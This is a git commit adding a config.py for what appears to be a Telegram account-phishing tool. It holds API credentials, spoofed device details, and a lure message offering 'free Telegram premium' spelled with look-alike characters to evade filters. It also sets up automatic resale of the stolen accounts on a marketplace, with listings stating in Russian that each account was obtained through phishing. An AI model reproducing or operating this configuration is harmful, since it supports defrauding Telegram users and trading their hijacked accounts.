8c369ec491b0cb07333ef60707cdb964cbc5187f
WeyzBusted <68425545+WeyzBusted@users.noreply.github.com>
2023-07-04 05:00:58 +0400

    Add files via upload

---
+++ config.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+api_id = 12857637
+api_hash = "96d45fb2da15cbec5585b90cee0d907e"
+device_model = "999 SM-G998B"
+system_version = "SDK 31"
+app_version = "8.4.1 (2522)"
+lang_code = "en"
+system_lang_code = "en-US"
+
+SEND_MSG = '@{username} — Бесплатный TeIеgrам prеmiuм 🎁'
+
+# Lolz Setting
+AUTO_SELL_LOLZ = True
+LOLZ_KEY = ''
+LOLZ_ACCOUNT_PRICE = 11
+LOLZ_ACCOUNT_PREMIUM_PRICE = 80
+LOLZ_ACCOUNT_TITLE = 'Телеграм | Прямо с печки | Лучшее качество'
+LOLZ_ACCOUNT_ORIGIN = 'fishing'
+LOLZ_ACCOUNT_DESCRIPTION = 'Этот аккаунт добыт через фишинг'
